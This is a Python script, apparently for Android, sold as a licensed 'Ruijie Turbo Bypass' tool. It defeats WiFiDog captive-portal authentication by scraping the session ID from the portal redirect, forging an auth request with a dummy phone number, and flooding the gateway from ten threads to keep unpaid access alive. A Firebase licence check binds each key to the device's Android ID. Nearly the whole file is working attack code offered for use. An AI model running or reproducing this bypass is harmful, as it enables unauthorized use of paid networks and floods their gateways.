import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
import sys
import subprocess
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# CONFIG (FIREBASE & PERFORMANCE)
# ===============================
# သင့်ရဲ့ Firebase Link ကို ဤနေရာတွင် ထည့်သွင်းထားသည်
BASE_URL = "https://skyblue-bypass-default-rtdb.firebaseio.com/Keys"
PING_THREADS = 10        
MIN_INTERVAL = 0.001     
MAX_INTERVAL = 0.01      

# ===============================
# COLOR SYSTEM
# ===============================
RED = "\033[91m"; GREEN = "\033[92m"; CYAN = "\033[96m"
YELLOW = "\033[93m"; MAGENTA = "\033[95m"; RESET = "\033[0m"
B_GREEN = "\033[1;32m"; B_CYAN = "\033[1;36m"; B_RED = "\033[1;31m"

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")
stop_event = threading.Event()

# ===============================
# KEY SYSTEM (FIREBASE INTEGRATED)
# ===============================
def get_hwid():
    try:
        cmd = subprocess.check_output("settings get secure android_id", shell=True)
        return cmd.decode().strip()
    except:
        return "unknown_device"

def check_approval():
    os.system('clear')
    print(f"{B_CYAN}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                ULTRA SPEED BYPASS SYSTEM                         ║")
    print(f"║                     ADMIN: @KENOBE21                             ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
    
    current_hwid = get_hwid()
    user_key = input(f"\n{YELLOW}[?] Enter Your License Key: {RESET}")
    
    print(f"{B_CYAN}[!] Verifying with SkyBlue Cloud Database...{RESET}")
    
    try:
        response = requests.get(f"{BASE_URL}/{user_key}.json")
        data = response.json()

        if data:
            expiry_date = datetime.strptime(data['expiry_date'], "%Y-%m-%d")
            status = data['status']
            saved_hwid = data.get('device_id', "")

            # ၁။ သက်တမ်းစစ်ခြင်း
            if status != "active" or expiry_date < datetime.now():
                print(f"\n{B_RED}[❌] KEY EXPIRED OR DEACTIVATED!{RESET}")
                return False

            # ၂။ Device Binding စစ်ခြင်း
            if saved_hwid == "" or saved_hwid == None:
                requests.patch(f"{BASE_URL}/{user_key}.json", json={"device_id": current_hwid})
                print(f"\n{B_GREEN}[✓] NEW DEVICE REGISTERED SUCCESSFULLY!{RESET}")
            elif saved_hwid != current_hwid:
                print(f"\n{B_RED}[❌] ACCESS DENIED! KEY LOCKED TO ANOTHER DEVICE.{RESET}")
                print(f"{YELLOW}[!] Contact Admin @Kenobe21 to reset HWID.{RESET}")
                return False
            
            print(f"\n{B_GREEN}[✓] ACCESS GRANTED! WELCOME {user_key.upper()}.{RESET}")
            time.sleep(1.5)
            return True
        else:
            print(f"\n{B_RED}[❌] INVALID LICENSE KEY!{RESET}")
            print(f"{YELLOW}[!] Contact Admin: @Kenobe21{RESET}")
            print(f"{YELLOW}[!] Your HWID: {RESET}{CYAN}{current_hwid}{RESET}")
            return False
    except Exception as e:
        print(f"\n{B_RED}[!] DATABASE ERROR: {e}{RESET}")
        return False

# ===============================
# BYPASS ENGINE
# ===============================
def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=2).status_code == 200
    except:
        return False

def banner():
    os.system('clear')
    print(f"""{MAGENTA}
╔══════════════════════════════════════╗
║     RUIJIE TURBO BYPASS (PRO)        ║
║     Optimized for Low Latency        ║
║     Powered by SkyBlue Database      ║
╚══════════════════════════════════════╝
{RESET}""")

def high_speed_ping(auth_link):
    session = requests.Session()
    session.verify = False
    adapter = requests.adapters.HTTPAdapter(pool_connections=PING_THREADS, pool_maxsize=PING_THREADS)
    session.mount('http://', adapter)
    
    while not stop_event.is_set():
        try:
            session.get(auth_link, timeout=3)
            sys.stdout.write(f"\r{B_GREEN}[✓] BYPASS STABLE | TURBO ACTIVE >>> [{random.randint(20,60)}ms]{RESET}")
            sys.stdout.flush()
        except:
            pass
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

def start_process():
    banner()
    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url:
                if check_real_internet():
                    sys.stdout.write(f"\r{YELLOW}[•] Internet Active. Monitoring Quality...{RESET}")
                    sys.stdout.flush()
                    time.sleep(5)
                    continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)

            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None

            if not sid:
                time.sleep(2)
                continue

            params = parse_qs(parsed_portal.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]
            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

            print(f"\n{CYAN}[*] Session ID: {sid} | Starting Turbo Threads...{RESET}")

            for _ in range(PING_THREADS):
                threading.Thread(target=high_speed_ping, args=(auth_link,), daemon=True).start()

            while check_real_internet():
                time.sleep(5)

        except Exception:
            time.sleep(2)

if __name__ == "__main__":
    try:
        if check_approval():
            start_process()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{RED}[!] Engine Shutdown.{RESET}")
